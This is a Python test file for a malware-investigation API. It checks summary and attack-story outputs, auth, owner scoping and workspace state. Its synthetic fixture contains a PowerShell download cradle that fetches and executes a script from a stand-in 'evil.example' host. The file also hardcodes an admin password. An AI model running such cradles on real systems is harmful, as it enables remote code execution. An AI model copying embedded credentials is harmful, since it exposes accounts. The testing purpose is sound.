"""PR-4 API endpoint tests (Executive Summary + Attack Story lenses).

Tests the L1 investigation API endpoints against the live preview URL to
validate the enriched PR-4 output shape, determinism, auth, owner
scoping, and workspace state persistence.
"""
from __future__ import annotations

import copy
import json
import os
import uuid

import pytest
import requests

BASE_URL = os.environ.get("PR4_TEST_BASE_URL") or os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/")
# Preview URL is known-flaky (Cloudflare 502 / ReadTimeout — see task notes).
# Set PR4_TEST_BASE_URL=http://localhost:8001 to run against local backend.
if not BASE_URL:
    # Fallback for running inside container without env
    with open("/app/frontend/.env") as f:
        for line in f:
            if line.startswith("REACT_APP_BACKEND_URL="):
                BASE_URL = line.strip().split("=", 1)[1].rstrip("/")
                break

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"

REQ_TIMEOUT = 120


def _request_with_retry(method, url, **kwargs):
    """Preview URL is known flaky (ReadTimeout). Retry up to 3 times."""
    kwargs.setdefault("timeout", REQ_TIMEOUT)
    last_exc = None
    for attempt in range(3):
        try:
            return requests.request(method, url, **kwargs)
        except (requests.exceptions.ReadTimeout,
                requests.exceptions.ConnectionError) as e:
            last_exc = e
            continue
    raise last_exc


# ---------------------------------------------------------------------------
# Helpers / fixtures
# ---------------------------------------------------------------------------


def _login(email: str, password: str) -> str:
    r = _request_with_retry("POST", 
        f"{BASE_URL}/api/auth/login",
        json={"email": email, "password": password},
        timeout=REQ_TIMEOUT,
    )
    assert r.status_code == 200, f"login failed for {email}: {r.status_code} {r.text}"
    tok = r.json().get("token") or r.json().get("access_token")
    assert tok, f"no token in login response: {r.text}"
    return tok


@pytest.fixture(scope="module")
def admin_token() -> str:
    return _login(ADMIN_EMAIL, ADMIN_PASSWORD)


@pytest.fixture(scope="module")
def admin_headers(admin_token: str) -> dict:
    return {"Authorization": f"Bearer {admin_token}", "Content-Type": "application/json"}


def _synthetic_bundle(case_id: str) -> dict:
    """Mirror of tests/l2_investigation/_fixtures.synthetic_bundle, JSON-ready."""
    return {
        "case_id": case_id,
        "certificate": {
            "iterations_executed": 4,
            "structural_changes": 1,
            "content_changes": 1,
            "decoder_changes": 1,
            "semantic_changes": 1,
            "canonical_state": True,
            "remaining_deterministic_ops": 0,
            "residual_obfuscation": "NONE",
            "final_artifact_hash_sha256": "f" * 64,
            "initial_artifact_hash_sha256": "0" * 64,
            "max_depth_reached": False,
            "terminated_reason": "canonical_state",
            "ready_for_behavioral_analysis": True,
            "interpreter": "powershell",
            "engine_version": "M1-1.0.0",
        },
        "canonical_output": 'powershell.exe -c "iex (New-Object Net.WebClient).DownloadString(\'http://evil.example/a.ps1\')"',
        "transformations": [
            {"iteration": 0, "pass_name": "structural", "transformation": "unwrap_powershell_command", "changed": True, "before_hash": "a" * 64, "after_hash": "b" * 64},
            {"iteration": 1, "pass_name": "content", "transformation": "normalize_whitespace", "changed": True, "before_hash": "b" * 64, "after_hash": "c" * 64},
            {"iteration": 2, "pass_name": "decoder", "transformation": "base64_decode", "changed": True, "before_hash": "c" * 64, "after_hash": "d" * 64},
            {"iteration": 3, "pass_name": "semantic", "transformation": "reveal_download_cradle", "changed": True, "before_hash": "d" * 64, "after_hash": "e" * 64},
        ],
        "iocs": [
            {"ioc_id": "ioc-001", "ioc_type": "url", "value": "http://evil.example/a.ps1", "source_iteration": 3, "source_span": [37, 65], "context": "DownloadString"},
            {"ioc_id": "ioc-002", "ioc_type": "domain", "value": "evil.example", "source_iteration": 3, "source_span": [44, 56]},
        ],
        "capabilities": [
            {"capability_id": "EXEC.POWERSHELL", "display_name": "PowerShell Execution", "confidence": "high", "source_iterations": [0]},
            {"capability_id": "NETWORK.DOWNLOAD", "display_name": "Network Download", "confidence": "high", "source_iterations": [3]},
        ],
        "mitre": [
            {"technique_id": "T1059.001", "technique_name": "PowerShell", "tactic": "execution", "via_capability": "EXEC.POWERSHELL", "source_iterations": [0]},
            {"technique_id": "T1105", "technique_name": "Ingress Tool Transfer", "tactic": "command-and-control", "via_capability": "NETWORK.DOWNLOAD", "source_iterations": [3]},
        ],
        "sample": {"family": "cobalt_strike", "technique": "download_cradle", "variant": "ps_download_string", "sample_id": "CS-2026-08-04-0001"},
    }


@pytest.fixture(scope="module")
def created_case(admin_headers) -> str:
    case_id = f"TEST-PR4-{uuid.uuid4().hex[:8]}"
    r = _request_with_retry("POST", 
        f"{BASE_URL}/api/investigation",
        headers=admin_headers,
        json={"bundle": _synthetic_bundle(case_id)},
        timeout=REQ_TIMEOUT,
    )
    assert r.status_code == 201, f"create case failed: {r.status_code} {r.text}"
    assert r.json()["case_id"] == case_id
    yield case_id
    # Cleanup
    _request_with_retry("DELETE", f"{BASE_URL}/api/investigation/{case_id}", headers=admin_headers, timeout=REQ_TIMEOUT)


# ---------------------------------------------------------------------------
# Auth / basic wiring
# ---------------------------------------------------------------------------


class TestAuth:
    def test_login_admin_ok(self):
        tok = _login(ADMIN_EMAIL, ADMIN_PASSWORD)
        assert isinstance(tok, str) and len(tok) > 10

    def test_summary_requires_auth(self, created_case):
        r = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/{created_case}/summary", timeout=REQ_TIMEOUT
        )
        assert r.status_code in (401, 403), f"expected 401/403 unauth, got {r.status_code}"

    def test_story_requires_auth(self, created_case):
        r = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/{created_case}/story", timeout=REQ_TIMEOUT
        )
        assert r.status_code in (401, 403), f"expected 401/403 unauth, got {r.status_code}"

    def test_case_not_found_returns_404(self, admin_headers):
        r = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/does-not-exist-xyz/summary",
            headers=admin_headers, timeout=REQ_TIMEOUT,
        )
        assert r.status_code == 404
        detail = r.json().get("detail", "")
        assert detail.startswith("case_not_found:"), f"unexpected detail: {detail}"


# ---------------------------------------------------------------------------
# Executive Summary endpoint
# ---------------------------------------------------------------------------


class TestExecutiveSummaryEndpoint:
    def test_summary_shape(self, admin_headers, created_case):
        r = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/{created_case}/summary",
            headers=admin_headers, timeout=REQ_TIMEOUT,
        )
        assert r.status_code == 200, r.text
        data = r.json()
        assert data.get("version") == "0.2.0-pr4", f"version mismatch: {data.get('version')}"
        body = data["body"]
        # Required PR-4 fields
        for k in ["verdict", "risk", "risk_score", "family", "technique",
                  "canonical_state", "ready_for_behavioral_analysis",
                  "top_iocs", "top_actions", "bullets"]:
            assert k in body, f"missing field: {k}"
        # Types & ranges
        assert isinstance(body["risk_score"], int)
        assert 0 <= body["risk_score"] <= 100
        assert body["risk"] in {"informational", "low", "medium", "high", "critical"}
        # Synthetic bundle → high or critical
        assert body["risk"] in {"high", "critical"}
        assert body["family"] == "cobalt_strike"
        # top_iocs / top_actions bounded to 3
        assert 0 <= len(body["top_iocs"]) <= 3
        assert 1 <= len(body["top_actions"]) <= 3
        for a in body["top_actions"]:
            for k in ("action_id", "priority", "text", "anchor"):
                assert k in a, f"action missing {k}: {a}"
            assert a["anchor"]["kind"] in {"ioc", "capability", "mitre"}
        assert len(body["bullets"]) >= 1
        for bl in body["bullets"]:
            for k in ("bullet_id", "text", "anchor"):
                assert k in bl, f"bullet missing {k}: {bl}"
            assert "kind" in bl["anchor"]

    def test_summary_deterministic(self, admin_headers, created_case):
        r1 = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/{created_case}/summary",
            headers=admin_headers, timeout=REQ_TIMEOUT,
        )
        r2 = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/{created_case}/summary",
            headers=admin_headers, timeout=REQ_TIMEOUT,
        )
        assert r1.status_code == 200 and r2.status_code == 200
        # Compare parsed JSON (byte-identical structure)
        assert r1.json() == r2.json()
        # And raw text
        assert r1.text == r2.text


# ---------------------------------------------------------------------------
# Attack Story endpoint
# ---------------------------------------------------------------------------


class TestAttackStoryEndpoint:
    def test_story_shape(self, admin_headers, created_case):
        r = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/{created_case}/story",
            headers=admin_headers, timeout=REQ_TIMEOUT,
        )
        assert r.status_code == 200, r.text
        data = r.json()
        assert data.get("version") == "0.2.0-pr4"
        body = data["body"]
        assert "events" in body and "chapters" in body and "narrative" in body
        assert len(body["events"]) == 4
        for e in body["events"]:
            for k in ("event_id", "iteration", "pass_name", "chapter",
                      "transformation", "text", "anchor"):
                assert k in e, f"event missing {k}: {e}"
            assert e["anchor"]["kind"] == "transformation"
        chapter_names = [c["chapter"] for c in body["chapters"]]
        assert chapter_names == ["Unwrap", "Normalize", "Decode", "Interpret"]
        for c in body["chapters"]:
            assert c["event_count"] >= 1
        narrative = body["narrative"]
        assert isinstance(narrative, str) and len(narrative) > 0
        assert "cobalt_strike" in narrative

    def test_story_deterministic(self, admin_headers, created_case):
        r1 = _request_with_retry("GET", f"{BASE_URL}/api/investigation/{created_case}/story",
                          headers=admin_headers, timeout=REQ_TIMEOUT)
        r2 = _request_with_retry("GET", f"{BASE_URL}/api/investigation/{created_case}/story",
                          headers=admin_headers, timeout=REQ_TIMEOUT)
        assert r1.status_code == 200 and r2.status_code == 200
        assert r1.text == r2.text


# ---------------------------------------------------------------------------
# Workspace State persistence
# ---------------------------------------------------------------------------


class TestWorkspaceState:
    def test_put_selected_evidence_persists(self, admin_headers, created_case):
        r = _request_with_retry("PUT", 
            f"{BASE_URL}/api/investigation/{created_case}/workspace",
            headers=admin_headers,
            json={"selected_evidence_id": "ioc-001"},
            timeout=REQ_TIMEOUT,
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["selected_evidence_id"] == "ioc-001"

        # GET reflects change
        g = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/{created_case}/workspace",
            headers=admin_headers, timeout=REQ_TIMEOUT,
        )
        assert g.status_code == 200
        assert g.json()["selected_evidence_id"] == "ioc-001"

    def test_put_mode_and_active_lens(self, admin_headers, created_case):
        r = _request_with_retry("PUT", 
            f"{BASE_URL}/api/investigation/{created_case}/workspace",
            headers=admin_headers,
            json={"mode": "deep_analysis", "active_lens": "story",
                  "filters": {"severity": "high"}},
            timeout=REQ_TIMEOUT,
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["mode"] == "deep_analysis"
        assert body["active_lens"] == "story"
        assert body["filters"] == {"severity": "high"}


# ---------------------------------------------------------------------------
# Workspace bundle aggregation (regression)
# ---------------------------------------------------------------------------


class TestWorkspaceBundle:
    def test_bundle_contains_pr4_summary_and_story(self, admin_headers, created_case):
        r = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/{created_case}",
            headers=admin_headers, timeout=REQ_TIMEOUT,
        )
        assert r.status_code == 200, r.text
        data = r.json()
        assert data["case_id"] == created_case
        assert "workspace" in data
        out = data["output"]
        # workspace_bundle aggregates all L2 service outputs
        # Confirm summary + story surfaces are present with PR-4 shape.
        s = json.dumps(out)
        assert "0.2.0-pr4" in s, "PR-4 version marker not found in workspace bundle"
        assert "cobalt_strike" in s


# ---------------------------------------------------------------------------
# Owner scoping (SEC-003)
# ---------------------------------------------------------------------------


class TestOwnerScoping:
    def test_other_user_cannot_read(self, admin_headers, created_case):
        # No public register endpoint exists — seed a second user directly
        # in MongoDB (mirrors seed_admin() logic) so we can validate the
        # 403 owner-scoping path end-to-end.
        try:
            import os as _os
            import sys
            sys.path.insert(0, "/app/backend")
            from pymongo import MongoClient
            import bcrypt as _bcrypt
        except Exception as e:
            pytest.skip(f"cannot seed second user: {e}")

        second_email = f"TEST_pr4-{uuid.uuid4().hex[:6]}@example.com"
        second_pw = "TestPass123!Str0ng"
        mongo_url = None
        db_name = None
        # ALWAYS read from /app/backend/.env — do NOT trust env vars here
        # because /app/backend/conftest.py forces DB_NAME=nivxray_ci_local
        # for unit tests, but the running backend uses the .env value
        # (test_database). Owner-scoping test must hit the same DB the
        # backend hits.
        for line in open("/app/backend/.env"):
            if line.startswith("MONGO_URL="):
                mongo_url = line.strip().split("=", 1)[1].strip('"').strip("'")
            elif line.startswith("DB_NAME="):
                db_name = line.strip().split("=", 1)[1].strip('"').strip("'")
        client = MongoClient(mongo_url)
        db = client[db_name]
        hashed = _bcrypt.hashpw(second_pw.encode(), _bcrypt.gensalt()).decode()
        db.users.insert_one({
            "email": second_email,
            "password": hashed,
            "role": "analyst",
            "must_change_password": False,
        })
        print(f"[owner_scoping] seeded {second_email} in db={db_name}, mongo={mongo_url}", flush=True)
        try:
            tok = _login(second_email, second_pw)
        except AssertionError as e:
            db.users.delete_one({"email": second_email})
            pytest.skip(f"cannot login as second user: {e}")

        h2 = {"Authorization": f"Bearer {tok}"}
        try:
            rs = _request_with_retry("GET", 
                f"{BASE_URL}/api/investigation/{created_case}/summary",
                headers=h2, timeout=REQ_TIMEOUT,
            )
            assert rs.status_code == 403, f"expected 403 for cross-owner, got {rs.status_code}"

            rt = _request_with_retry("GET", 
                f"{BASE_URL}/api/investigation/{created_case}/story",
                headers=h2, timeout=REQ_TIMEOUT,
            )
            assert rt.status_code == 403
        finally:
            db.users.delete_one({"email": second_email})


# ---------------------------------------------------------------------------
# Regression: list_cases + state transitions
# ---------------------------------------------------------------------------


class TestRegression:
    def test_list_cases_includes_created(self, admin_headers, created_case):
        r = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation", headers=admin_headers, timeout=REQ_TIMEOUT
        )
        assert r.status_code == 200
        ids = [c["case_id"] for c in r.json().get("cases", [])]
        assert created_case in ids

    def test_state_transition_valid_target(self, admin_headers, created_case):
        # Fetch allowed states and attempt to advance to the next state.
        gs = _request_with_retry("GET", 
            f"{BASE_URL}/api/investigation/{created_case}/state",
            headers=admin_headers, timeout=REQ_TIMEOUT,
        )
        assert gs.status_code == 200
        allowed = gs.json()["allowed_states"]
        cur = gs.json()["current_state"]
        # Attempt to move to the next state in STATE_ORDER
        if cur in allowed:
            idx = allowed.index(cur)
            if idx + 1 < len(allowed):
                target = allowed[idx + 1]
                r = _request_with_retry("POST", 
                    f"{BASE_URL}/api/investigation/{created_case}/state/transition",
                    headers=admin_headers, json={"target": target, "reason": "test"},
                    timeout=REQ_TIMEOUT,
                )
                # Accept either success (200) or a 409 if not a valid direct
                # transition (state machine may enforce non-linear rules).
                assert r.status_code in (200, 409), r.text
